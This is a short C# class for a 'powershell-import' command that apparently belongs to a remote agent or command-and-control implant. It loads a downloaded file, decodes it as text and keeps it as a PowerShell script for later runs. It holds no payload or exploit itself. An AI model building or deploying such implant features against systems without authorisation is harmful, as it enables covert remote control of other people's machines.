using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class PowerShellImportCommand : AgentCommand
    {
        public override string Name => "powershell-import";
        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            this.CheckFileDownloaded(task, context);

            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
            var fileContent = file.GetFileContent();


            Script = Encoding.UTF8.GetString(fileContent);
            this.Notify(context, $"{task.FileName} Dowloaded and set ad Import script");
        }

        public static string Script { get; set; }
    }
}
